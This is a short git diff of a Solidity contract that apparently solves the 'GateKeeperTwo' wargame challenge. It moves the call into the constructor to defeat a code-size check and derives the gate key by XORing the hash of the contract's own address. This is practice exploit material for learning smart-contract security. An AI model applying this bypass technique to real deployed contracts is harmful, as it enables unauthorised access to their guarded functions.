@@ -13,14 +13,12 @@ contract GateKeeperSolution {
     constructor(address _gkAddress) {
         gkAddress = _gkAddress;
         gk = GateKeeperTwo(_gkAddress);
-        console.log(_gkAddress);
-        console.log(_gkAddress);
-    }
 
-    function callEnter(bytes8 _gateKey) external {
-        address(gkAddress).delegatecall(
-            abi.encodeWithSignature("enter(bytes8)", _gateKey)
+        bytes8 _gateKey = bytes8(
+            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
+                uint64(0xFFFFFFFFFFFFFFFF)
         );
-        // gk.enter(_gateKey);
+
+        gk.enter(_gateKey);
     }
 }
